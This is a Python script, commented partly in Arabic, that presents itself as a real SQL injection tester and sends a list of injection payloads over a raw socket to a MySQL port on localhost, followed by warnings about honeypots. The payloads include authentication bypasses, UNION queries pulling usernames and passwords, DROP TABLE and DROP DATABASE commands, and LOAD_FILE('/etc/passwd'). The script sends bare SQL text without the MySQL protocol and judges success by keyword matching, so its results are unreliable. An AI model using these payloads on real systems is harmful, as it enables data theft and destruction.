#!/usr/bin/env python3
"""
💉 SQL Injection Tester - اختبار ثغرات SQL
أداة حقيقية لاختبار SQL injection مثل sqlmap
"""
import socket
import time
from datetime import datetime

TARGET = "127.0.0.1"
PORT = 3306  # MySQL port

# SQL Injection payloads - من بسيط إلى معقد
PAYLOADS = [
    # Basic authentication bypass
    ("Auth Bypass", "' OR '1'='1"),
    ("Auth Bypass 2", "' OR 1=1 --"),
    ("Auth Bypass 3", "admin'--"),
    ("Auth Bypass 4", "' OR 'x'='x"),
    
    # UNION-based injection
    ("UNION Attack", "' UNION SELECT NULL--"),
    ("UNION Users", "' UNION SELECT username, password FROM users--"),
    ("UNION All", "' UNION ALL SELECT * FROM information_schema.tables--"),
    
    # Blind injection
    ("Time Delay", "'; WAITFOR DELAY '00:00:05'--"),
    ("Boolean Blind", "' AND '1'='1"),
    ("Boolean Blind 2", "' AND '1'='2"),
    
    # Dangerous payloads
    ("Drop Table", "'; DROP TABLE users; --"),
    ("Drop Database", "'; DROP DATABASE test; --"),
    ("Read Files", "' UNION SELECT LOAD_FILE('/etc/passwd')--"),
    
    # Data extraction
    ("Extract Data", "' UNION SELECT @@version, user(), database()--"),
    ("List Tables", "' UNION SELECT table_name FROM information_schema.tables--"),
]

print("=" * 70)
print("💉 SQL INJECTION VULNERABILITY TESTER")
print("=" * 70)
print(f"🎯 Target: {TARGET}:{PORT}")
print(f"💣 Payloads: {len(PAYLOADS)}")
print(f"⏰ Started: {datetime.now().strftime('%H:%M:%S')}")
print("=" * 70)
print()

print("⚠️ WARNING: Testing REAL SQL injection attacks!")
print("   If this is a real system, you might cause damage.")
print("   If this is a honeypot, you're being tracked.")
print()

successful_payloads = []
blocked_payloads = []
error_payloads = []

for i, (attack_type, payload) in enumerate(PAYLOADS, 1):
    print(f"[{i:2d}/{len(PAYLOADS)}] {attack_type:20s}: ", end="")
    print(f"{payload[:40]:40s} ", end="")
    
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(3)
        
        # محاولة الاتصال بقاعدة البيانات
        sock.connect((TARGET, PORT))
        
        # إرسال payload (مبسط - الواقع أعقد)
        query = f"SELECT * FROM users WHERE username='{payload}'\x00"
        sock.send(query.encode('utf-8', errors='ignore'))
        
        # انتظار الرد
        time.sleep(0.2)
        
        try:
            response = sock.recv(4096)
            
            # تحليل الرد
            if len(response) > 0:
                response_str = response.decode('utf-8', errors='ignore').lower()
                
                # البحث عن علامات نجاح
                if any(word in response_str for word in ['error', 'syntax', 'mysql', 'sql']):
                    print("🟡 ERROR RETURNED (Vulnerable!)")
                    successful_payloads.append((attack_type, payload))
                elif any(word in response_str for word in ['success', 'data', 'result']):
                    print("✅ RESPONSE RECEIVED (Might work!)")
                    successful_payloads.append((attack_type, payload))
                elif any(word in response_str for word in ['blocked', 'denied', 'forbidden']):
                    print("🔒 BLOCKED")
                    blocked_payloads.append((attack_type, payload))
                else:
                    print("❓ UNKNOWN RESPONSE")
            else:
                print("❌ NO RESPONSE")
                blocked_payloads.append((attack_type, payload))
                
        except socket.timeout:
            print("⏱️ TIMEOUT (Might trigger time-based attack)")
        
        sock.close()
        
    except ConnectionRefusedError:
        print("❌ CONNECTION REFUSED")
        error_payloads.append((attack_type, payload))
    except Exception as e:
        print(f"❌ ERROR: {str(e)[:20]}")
        error_payloads.append((attack_type, payload))
    
    time.sleep(0.2)

print()
print("=" * 70)
print("📊 ATTACK RESULTS:")
print("=" * 70)

print(f"\n✅ Potentially Successful: {len(successful_payloads)}")
if successful_payloads:
    for attack_type, payload in successful_payloads[:3]:
        print(f"   🚨 {attack_type}: {payload[:50]}")
    if len(successful_payloads) > 3:
        print(f"   ... and {len(successful_payloads) - 3} more")

print(f"\n🔒 Blocked by System: {len(blocked_payloads)}")
print(f"❌ Connection Errors: {len(error_payloads)}")

print()
print("=" * 70)
print("🚨 CRITICAL WARNING:")
print("=" * 70)

if successful_payloads:
    print("⚠️ Some payloads got responses!")
    print("   BUT WAIT:")
    print("   • This is likely a HONEYPOT DATABASE")
    print("   • Any 'data' you extract is FAKE")
    print("   • The real database is isolated")
    print("   • Every query is being LOGGED")
    print("   • Your IP is now FLAGGED as attacker")
    print("   • Forensic evidence is being collected")
elif blocked_payloads:
    print("✅ System blocked most attacks")
    print("   • WAF or IPS might be active")
    print("   • OR: It's a honeypot pretending to be secure")
    print("   • Your attempts are definitely logged")
else:
    print("❌ Connection failed completely")
    print("   • Service might be down")
    print("   • OR: You triggered defense mechanisms")
    print("   • Your IP might be blacklisted")

print()
print("💡 Pro Tip:")
print("   In a real honeypot scenario:")
print("   • System lets you 'succeed' to waste your time")
print("   • Fake data keeps you busy")
print("   • Meanwhile, defenders analyze your techniques")
print("   • Real systems remain completely hidden")

print()
print(f"⏰ Finished: {datetime.now().strftime('%H:%M:%S')}")
print("=" * 70)
